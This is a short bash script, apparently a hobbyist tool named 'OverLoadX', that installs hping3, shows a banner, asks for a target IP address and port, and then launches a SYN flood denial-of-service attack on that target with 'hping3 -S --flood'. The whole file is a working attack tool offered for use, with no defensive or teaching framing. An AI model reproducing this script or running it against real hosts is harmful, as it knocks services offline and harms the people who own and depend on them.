#!/bin/bash
C_RED1="\033[38;5;196m"
NO_FORMAT="\033[0m"
sudo apt-get install hping3
clear
echo """ 
 ___   _      ____  ___   _     ___    __    ___   _    
/ / \ \ \  / | |_  | |_) | |   / / \  / /\  | | \ \ \_/ 
\_\_/  \_\/  |_|__ |_| \ |_|__ \_\_/ /_/--\ |_|_/ /_/ \ 
 """
echo
echo "OverLoadX by encypt | dont be afraid "
echo
echo
echo "Target IP:" && read ip
echo
echo "Target Port:" && read port
echo "SENDING ATTACK TO $ip in PORT $port | TO STOP: CTRL + C..."
sudo hping3 -S --flood -V -p $port $ip
